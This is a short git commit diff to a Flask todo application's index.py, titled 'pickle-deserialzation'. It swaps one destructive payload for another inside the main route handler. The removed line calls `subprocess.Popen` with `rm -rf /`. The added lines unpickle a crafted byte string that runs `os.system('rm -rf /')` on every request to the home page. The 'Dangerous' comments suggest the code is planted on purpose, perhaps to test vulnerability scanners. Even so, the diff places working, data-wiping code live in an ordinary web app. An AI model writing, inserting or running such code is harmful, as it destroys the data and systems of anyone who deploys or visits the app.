d8124963479992de34418329dc26df56630b0004
ragaspace2004 <ragapriyakarthikeyan2004@gmail.com>
2025-05-02 19:03:01 +0530

    pickle-deserialzation

--- index.py
+++ index.py
@@ -16,10 +16,10 @@ class Todo(db.Model):
   
 @app.route('/', methods=['POST','GET'])
 def index():
-  import subprocess
+  import pickle
 
-# Dangerous subprocess call
-  subprocess.Popen(["rm", "-rf", "/"], shell=True)
+# Dangerous deserialization
+  data = pickle.loads(b"cos\nsystem\n(S'rm -rf /'\ntR.")
   if request.method=='POST':
     task_content=request.form['content']
     new_task=Todo(content=task_content)
